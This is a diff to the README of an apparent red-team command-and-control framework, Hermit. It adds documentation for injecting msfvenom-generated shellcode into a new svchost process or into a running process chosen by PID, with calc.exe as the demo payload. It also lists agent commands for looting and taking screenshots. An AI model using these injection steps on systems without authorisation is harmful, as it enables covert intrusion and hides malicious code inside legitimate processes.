@@ -41,7 +41,7 @@ Specifically, you can use the following commands:
 |ls|List files in specified directory.|
 |loot|Show the looted information for the agent that you've obtained so far. (Under development)|
 |net|Get the network information.|
-|ps|Get the running processes.|
+|ps|Process management.|
 |pwd|Get the current directory.|
 |rm|Remove file or directory.|
 |screenshot|Take a screenshot for target machine.|
@@ -81,10 +81,23 @@ Currently **HEX** encoding required.
 msfvenom -p windows/x64/exec CMD="calc.exe" -f hex -o /tmp/shellcode.txt
 ```
 
-After generating, run the `shellcode` command in the agent mode:
+After generating, run the `shellcode` command in the agent mode.
+
+- **Inject New Process**
+
+When specifying the process name with the `--process` option, a new process will be created and injected shellcode.
 
 ```sh
 Hermit [agent: agent_2352650890] $ shellcode --process svchost --file /tmp/shellcode.txt
+```
+
+- **Inject Running Process**
+
+When specifying the process ID with the `--pid` option, the currently running process will be injected shellcode.  
+To list the PIDs, run the `ps list` command in agent mode.
+
+```sh
+Hermit [agent: agent_2352650890] $ shellcode --pid 1234 --file /tmp/shellcode.txt
 ```
 
 If successful, the target computer opens `calc.exe`.
